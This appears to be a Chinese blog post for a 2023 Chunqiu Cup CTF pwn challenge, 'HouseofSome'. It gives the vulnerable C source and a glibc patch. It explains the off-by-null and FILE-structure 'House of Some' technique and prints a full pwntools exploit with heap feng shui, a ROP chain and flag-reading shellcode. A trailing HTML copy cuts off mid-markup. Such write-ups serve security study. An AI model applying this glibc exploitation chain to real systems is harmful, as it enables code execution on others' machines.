{"title":"[2023春秋杯冬季赛]Pwn HouseofSome wp","date":"2024-01-23T14:40:38.000Z","toc":true,"source":"_posts/houseofsome-ichunqiu.md","raw":"---\ntitle: \"[2023春秋杯冬季赛]Pwn HouseofSome wp\"\ncomments: true\ntoc: true\ndate: 2024-01-23 22:40:38\ntags:\n  - CTF\n  - Pwn\n  - House\n---\n\n## 题目\n\n题目源码如下\n\n```C\n// gcc houseofsome.c -o houseofsome -Wl,--dynamic-linker=./ld-linux-x86-64.so.2 -Wl,--rpath=./\n#include<stdio.h>\n#include <stdlib.h>\n#include<sys/mman.h>\n#include <linux/seccomp.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/prctl.h>\n\nstatic void install_seccomp() {\n  static unsigned char filter[] = {32,0,0,0,4,0,0,0,21,0,0,5,62,0,0,192,32,0,0,0,0,0,0,0,53,0,3,0,0,0,0,64,21,0,2,0,59,0,0,0,21,0,1,0,66,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0};\n  struct prog {\n    unsigned short len;\n    unsigned char *filter;\n  } rule = {\n    .len = sizeof(filter) >> 3,\n    .filter = filter\n  };\n  if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) { perror(\"prctl(PR_SET_NO_NEW_PRIVS)\"); exit(2); }\n  if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0) { perror(\"prctl(PR_SET_SECCOMP)\"); exit(2); }\n}\n\nint init() {\n    size_t tmp1 = stdin;\n    setbuf(tmp1, 0);\n    size_t tmp2 = stdout;\n    setbuf(tmp2, 0);\n    size_t tmp3 = stderr;\n    setbuf(tmp3, 0);\n    install_seccomp();\n}\n\nsize_t getint(){\n    size_t tmp;\n    scanf(\"%lld\", &tmp);\n    return tmp;\n}\n\nvoid readline(char *buf, size_t n) {\n    char tmp;\n    size_t i = 0;\n    for(; i < n && read(0, &tmp, 1) > 0; ++i) {\n        if(tmp == '\\n') {\n            buf[i] = 0;\n            return;\n        }\n        buf[i] = tmp;\n    }\n    buf[i] = 0;\n} \n\nchar *name = 0;\nFILE* dev = 0;\nint magic = 0;\nchar *pool[2] = {0};\nint idx = 1;\n\nvoid change_name(){\n    char buf[0x100];\n    size_t size;\n    printf(\"size> \");\n    size = getint();\n    if(size <= 0 || size > 0x2000) {\n        puts(\"wrong.\");\n        return;\n    }\n    idx = 1 - idx;\n    name = pool[idx];\n    if(name) free(name);\n    printf(\"name> \");\n    name = malloc(size + 1);\n    pool[idx] = name;\n    readline(name, size);\n}\n\nvoid change_dev() {\n    char buf[0x100];\n    if(dev) fclose(dev);\n    size_t op;\n    printf(\"1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev> \");\n    op = getint();\n    if(op == 1) dev = fopen(\"/dev/urandom\", \"rb\");\n    else if(op == 2) dev = fopen(\"/dev/zero\", \"rb\");\n    else dev = fopen(\"/dev/null\", \"rb\");\n    if(dev == NULL){\n        puts(\"open dev error.\");\n        return;\n    }\n    setbuf(dev, 0);\n}\n\nvoid draw() {\n    char buf[0x100];\n    if(magic || !dev || !name) {\n        puts(\"wrong.\");\n        return;\n    }\n    size_t addr, length;\n    printf(\"offset> \");\n    addr = getint();\n    printf(\"length> \");\n    length = getint();\n    if(length < 0 || length > 8) {\n        puts(\"wrong.\");\n        return;\n    }\n    fread(0x114514000+addr, 1, 1, dev);\n    magic = 1;\n}\n\nvoid show() {\n    char buf[0x100];\n    printf(\"name: %s\\n\", name);\n    printf(\"picture: \");\n    write(1, 0x114514000, 0x1000);\n    printf(\"\\n\");\n}\n\nint main(){\n    init();\n    size_t choice;\n    if(mmap(0x114514000, 0x1000, PROT_READ | PROT_WRITE, 0x22, -1, 0) == -1){\n        printf(\"mmap error.\\n\");\n        exit(0);\n    }\n    printf(\"gift: %p\\n\", 0x114514000);\n    while (1) {\n        printf(\"1. name\\n2. dev\\n3. draw\\n4 .show\\n5. exit\\n> \");\n        choice = getint();\n        switch (choice){\n            case 1:\n                change_name();\n                break;\n            case 2:\n                change_dev();\n                break;\n            case 3:\n                draw();\n                break;\n            case 4:\n                show();\n                break;  \n            case 5:\n                exit(0);\n                break;\n            default:\n                printf(\"invalid option %ld.\\n\", choice);\n                break;\n        }\n    }\n    \n}\n```\n\n除了题目代码之外，还自己编译了一个libc，加上patch，patch如下\n\n```diff\ndiff --git a/libio/libioP.h b/libio/libioP.h\nindex 745278e..b3858d1 100644\n--- a/libio/libioP.h\n+++ b/libio/libioP.h\n@@ -100,7 +100,7 @@\n #define _IO_JUMPS_FILE_plus(THIS) \\\n   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)\n #define _IO_WIDE_JUMPS(THIS) \\\n-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable\n+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable))\n #define _IO_CHECK_WIDE(THIS) \\\n   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)\n\n```\n\n可以看到，这里对wide_data加上了patch\n\n编译时的命令如下\n\n```shell\nCC=\"gcc\" CXX=\"g++\" CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" ../configure --prefix=/home/csome/houseofsome/glibc-2.38/build/x64 --disable-werror --enable-bind-now\nmake\nmake install\n```\n\n详细编译流程见Tover师兄写的https://0xffff.one/d/337\n\n## 简单的分析\n\n通过逆向可以知道，这里泄露libc是通过scanf的未写入trick实现的，但是ida观察init函数的时候，并不能发现stdin等数据放到了栈上，需要gdb观察或者阅读汇编才知道。\n\n```C\nint init() {\n    size_t tmp1 = stdin;\n    setbuf(tmp1, 0);\n    size_t tmp2 = stdout;\n    setbuf(tmp2, 0);\n    size_t tmp3 = stderr;\n    setbuf(tmp3, 0);\n    install_seccomp();\n}\n```\n\n其次，这里有一次libc内任意地址写\\x00的机会在draw功能\n\n```C\nvoid draw() {\n    char buf[0x100];\n    if(magic || !dev || !name) {\n        puts(\"wrong.\");\n        return;\n    }\n    size_t addr, length;\n    printf(\"offset> \");\n    addr = getint();\n    printf(\"length> \");\n    length = getint();\n    if(length < 0 || length > 8) {\n        puts(\"wrong.\");\n        return;\n    }\n    fread(0x114514000+addr, 1, 1, dev);\n    magic = 1;\n}\n```\n\n还有一个小trick——fopen，这个函数会使用malloc分配一个IO_FILE_plus结构，作为打开文件的管理块，并通过头插法进入IO_list_all\n\n```C\nvoid change_dev() {\n    char buf[0x100];\n    if(dev) fclose(dev);\n    size_t op;\n    printf(\"1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev> \");\n    op = getint();\n    if(op == 1) dev = fopen(\"/dev/urandom\", \"rb\");\n    else if(op == 2) dev = fopen(\"/dev/zero\", \"rb\");\n    else dev = fopen(\"/dev/null\", \"rb\");\n    if(dev == NULL){\n        puts(\"open dev error.\");\n        return;\n    }\n    setbuf(dev, 0);\n}\n```\n\n总结一下\n\n1. 已知Libc地址\n2. 一次libc内任意地址写1字节\\x00，off by null\n3. fopen能使得IO_list_all内写入heap地址\n4. 由于wide_data的vtable加入了check，故不能使用apple2的链条\n\n## House of Some\n\n详细的原理见https://blog.csome.cc/p/house-of-some/\n\n其使用的方法是\n\n1. 已知glibc基地址\n2. 可控的已知地址（可写入内容构造fake file）\n3. 需要一次libc内任意地址写可控地址\n4. 程序能正常退出或者通过exit()退出\n\n其中，条件1和4程序中可以直接满足，条件3可以通过fopen和一次off by null完成，条件2可以被弱化，并不需要已知，只需要可控即可\n\n那么在构造任意地址写的fake_file的过程中，需要wide_data指针，这个指针需要在可控地址位置——堆内，但是我们并不能泄露堆地址\n\n```python\nfake_file_read = flat({\n    0x00: 0, # _flags\n    0x20: 0, # _IO_write_base\n    0x28: 0, # _IO_write_ptr\n    \n    0x38: 任意地址写的起始地址, # _IO_buf_base\n    0x40: 任意地址写的终止地址, # _IO_buf_end\n\t\n    0x70: 0, # _fileno\n    0x82: b\"\\x00\", # _vtable_offset\n    0xc0: 2, # _mode\n    0xa0: wide_data的地址, # _wide_data\n    0x68: 下一个调用的fake file地址, # _chain\n    0xd8: _IO_wfile_jumps, # vtable\n}, filler=b\"\\x00\")\n\nfake_wide_data = flat({\n    0xe0: _IO_file_jumps - 0x48,\n    0x18: 0,\n    0x20: 1,\n    0x30: 0,\n}, filler=b\"\\x00\")\n```\n\n这里需要使用largebin的next size指针残留，构造出一个合法的wide_data地址\n\nPS：这里可以运用https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more，改进后就不需要wide_data了\n\n风水脚本如下\n\n```python\nname(0x2b0-1, flat({\n    0x260: {\n        0x18: 0,\n        0x20: 1,\n        0x30: 0,\n    }\n}, filler=b\"\\x00\") + b\"\\n\")\nname(0x1f00-0x730-1, b\"aa\" + b\"\\n\")\nname(0x400-1, b\"aa\" + b\"\\n\")\nname(0x590-1, flat({\n    0xe0-0x60: libc.symbols['_IO_file_jumps'] - 0x48\n}, filler=b\"\\x00\") + b\"\\n\")\nname(0x50-1, b\"aa\" + b\"\\n\")\nname(0x600-1, b\"aa\" + b\"\\n\")\nname(0x610-1, b\"aa\" + b\"\\n\")\nname(0x300-1, b\"aa\" + b\"\\n\")\nname(0x2f0-1, b\"aa\" + b\"\\n\")\nname(0x360-1, b\"aa\" + b\"\\n\")\nname(0x210-1, b\"aa\" + b\"\\n\")\n```\n\n最后伪造，这里中间需要使用指针残留，所以伪造fake_file的时候，需要分开\n\n```python\nenviron = libc.symbols['__environ']\nname(0xb0-1, flat({\n    0x00: 0, # _flags\n    0x20: 0, # _IO_write_base\n    0x28: 0, # _IO_write_ptr\n    \n    0x38: environ+8, # _IO_buf_base\n    0x40: environ+8+0x400, # _IO_buf_end\n\t\n    0x70: 0, # _fileno\n    0x68: environ+8, # _chain\n    0x82: b\"\\x00\", # _vtable_offset\n    0x88: environ-0x10,\n    0xa0: b\"\\n\"\n}, filler=b\"\\x00\"))\nname(0x20-1, flat({\n    0xc0-0x20-0xa0: 2, # _mode\n    0xd8-0x20-0xa0: libc.symbols['_IO_wfile_jumps'], # vtable\n}, filler=b\"\\x00\")[:-1] + b\"\\n\")\n```\n\n最后houseofsome一把梭\n\n## 完整exp\n\nHouse_of_some工具见https://github.com/CsomePro/House-of-Some\n\n```python\nfrom pwn import *\nfrom House_of_some import HouseOfSome\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\nshellcode = asm(\nf\"\"\"\nmov rax, {u64(b\"./flag\" + bytearray([0,0]))}\npush rax\nmov rdi, rsp\nmov rsi, 0\nmov rax, 2\nsyscall\n\nmov rdi, rax\nmov rsi, rsp\nmov rdx, 0x40\nmov rax, 0\nsyscall\n\nmov rdi, 1\nmov rsi, rsp\nmov rdx, 0x40\nmov rax, 1\nsyscall\n\"\"\")\n\nio = process(\"./houseofsome\")\n# io = remote(\"127.0.0.1\", 12000)\ntob = lambda x: str(x).encode()\n\ndef name(size, content):\n    io.sendlineafter(b\"> \", b\"1\")\n    io.sendlineafter(b\"size> \", tob(size))\n    io.sendafter(b\"name> \", content)\n\ndef dev(idx):\n    io.sendlineafter(b\"> \", b\"2\")\n    io.sendlineafter(b\"dev> \", tob(idx))\n    \ndef draw(offset, length):\n    io.sendlineafter(b\"> \", b\"3\")\n    io.sendlineafter(b\"offset> \", tob(offset))\n    io.sendlineafter(b\"length> \", tob(length))\n\ndef leave():\n    io.sendlineafter(b\"> \", b\"5\")\n\nio.sendlineafter(b\"> \", b\"-\")\nio.recvuntil(b\"invalid option \")\nleak = int(io.recvuntil(b\".\", drop=True))\nlog.success(f\"leak : {leak:#x}\")\nlibc_base = leak - 0x2205c0\nlog.success(f\"libc_base : {libc_base:#x}\")\n\nlibc = ELF(\"./libc.so.6\", checksec=None)\nlibc.address = libc_base\n\nname(0x2b0-1, flat({\n    0x260: {\n        0x18: 0,\n        0x20: 1,\n        0x30: 0,\n    }\n}, filler=b\"\\x00\") + b\"\\n\")\nname(0x1f00-0x730-1, b\"aa\" + b\"\\n\")\nname(0x400-1, b\"aa\" + b\"\\n\")\nname(0x590-1, flat({\n    0xe0-0x60: libc.symbols['_IO_file_jumps'] - 0x48\n}, filler=b\"\\x00\") + b\"\\n\")\nname(0x50-1, b\"aa\" + b\"\\n\")\nname(0x600-1, b\"aa\" + b\"\\n\")\nname(0x610-1, b\"aa\" + b\"\\n\")\nname(0x300-1, b\"aa\" + b\"\\n\")\nname(0x2f0-1, b\"aa\" + b\"\\n\")\nname(0x360-1, b\"aa\" + b\"\\n\")\nname(0x210-1, b\"aa\" + b\"\\n\")\n\nenviron = libc.symbols['__environ']\n\nname(0xb0-1, flat({\n    0x00: 0, # _flags\n    0x20: 0, # _IO_write_base\n    0x28: 0, # _IO_write_ptr\n    \n    0x38: environ+8, # _IO_buf_base\n    0x40: environ+8+0x400, # _IO_buf_end\n\t\n    0x70: 0, # _fileno\n    0x68: environ+8, # _chain\n    0x82: b\"\\x00\", # _vtable_offset\n    0x88: environ-0x10,\n    0xa0: b\"\\n\"\n}, filler=b\"\\x00\"))\n\nname(0x20-1, flat({\n    0xc0-0x20-0xa0: 2, # _mode\n    0xd8-0x20-0xa0: libc.symbols['_IO_wfile_jumps'], # vtable\n}, filler=b\"\\x00\")[:-1] + b\"\\n\")\n\ndev(2)\ndraw(libc.symbols[\"_IO_list_all\"] - 0x114514000, 1)\nleave()\n\nhos = HouseOfSome(libc, environ+8, environ-0x10)\nstack = hos.bomb_raw(io, libc.symbols[\"_IO_flush_all\"] + 481)\nlog.success(f\"stack : {stack:#x}\")\n\npop_rdx = 0x0000000000096272 + libc_base\n\nrop = ROP(libc)\nrop.base = stack\nrop.raw(pop_rdx)\nrop.raw(7)\nrop.call('mprotect', [stack & (~0xfff), 0x1000])\nrop.raw(stack + 0x40)\nlog.info(rop.dump())\nrop_chain = rop.chain()\n\nassert b\"\\n\" not in rop_chain, \"\\\\n in rop_chain\"\nio.sendline(rop_chain + shellcode)\n\ncontext.log_level = 'info'\nio.interactive()\n```\n\n## 碎碎念\n\n出题的时候有些疏忽，忘记了main_arena也在libc内，导致可以off by null修改TopChunk，使得最后能够控制堆结构\n\n但是这个方法较为复杂，是一个小小的非预期，在比赛还有30个小时多的时候放出，在14小时之后出现第一血，最后只有5解出，算是预期之内吧\n\n接下来如果还有机会，我还会带来更加有趣的利用手法的题目，敬请期待吧\n","slug":"houseofsome-ichunqiu","published":true,"updated":"2025-10-28T08:00:40.775Z","_id":"cuidbZigRKQOKUj9c7ok9GX0l","comments":true,"layout":"post","photos":[],"html":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>题目源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// gcc houseofsome.c -o houseofsome -Wl,--dynamic-linker=./ld-linux-x86-64.so.2 -Wl,--rpath=./</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">install_seccomp</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> filter[] = &#123;<span class=\"number\">32</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">5</span>,<span class=\"number\">62</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">192</span>,<span class=\"number\">32</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">53</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">64</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">59</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">66</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">255</span>,<span class=\"number\">127</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">prog</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">short</span> len;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *filter;</span><br><span class=\"line\">  &#125; rule = &#123;</span><br><span class=\"line\">    .len = <span class=\"keyword\">sizeof</span>(filter) &gt;&gt; <span class=\"number\">3</span>,</span><br><span class=\"line\">    .filter = filter</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(prctl(PR_SET_NO_NEW_PRIVS, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123; perror(<span class=\"string\">&quot;prctl(PR_SET_NO_NEW_PRIVS)&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>); &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;rule) &lt; <span class=\"number\">0</span>) &#123; perror(<span class=\"string\">&quot;prctl(PR_SET_SECCOMP)&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp1 = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\">    setbuf(tmp1, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp2 = <span class=\"built_in\">stdout</span>;</span><br><span class=\"line\">    setbuf(tmp2, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp3 = <span class=\"built_in\">stderr</span>;</span><br><span class=\"line\">    setbuf(tmp3, <span class=\"number\">0</span>);</span><br><span class=\"line\">    install_seccomp();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">getint</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%lld&quot;</span>, &amp;tmp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">readline</span><span class=\"params\">(<span class=\"type\">char</span> *buf, <span class=\"type\">size_t</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> tmp;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; i &lt; n &amp;&amp; read(<span class=\"number\">0</span>, &amp;tmp, <span class=\"number\">1</span>) &gt; <span class=\"number\">0</span>; ++i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tmp == <span class=\"string\">&#x27;\\n&#x27;</span>) &#123;</span><br><span class=\"line\">            buf[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        buf[i] = tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    buf[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *name = <span class=\"number\">0</span>;</span><br><span class=\"line\">FILE* dev = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> magic = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *pool[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> idx = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_name</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"type\">size_t</span> size;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size&gt; &quot;</span>);</span><br><span class=\"line\">    size = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(size &lt;= <span class=\"number\">0</span> || size &gt; <span class=\"number\">0x2000</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    idx = <span class=\"number\">1</span> - idx;</span><br><span class=\"line\">    name = pool[idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(name) <span class=\"built_in\">free</span>(name);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name&gt; &quot;</span>);</span><br><span class=\"line\">    name = <span class=\"built_in\">malloc</span>(size + <span class=\"number\">1</span>);</span><br><span class=\"line\">    pool[idx] = name;</span><br><span class=\"line\">    readline(name, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_dev</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev) fclose(dev);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> op;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev&gt; &quot;</span>);</span><br><span class=\"line\">    op = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) dev = fopen(<span class=\"string\">&quot;/dev/urandom&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) dev = fopen(<span class=\"string\">&quot;/dev/zero&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> dev = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;open dev error.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setbuf(dev, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(magic || !dev || !name) &#123;</span><br><span 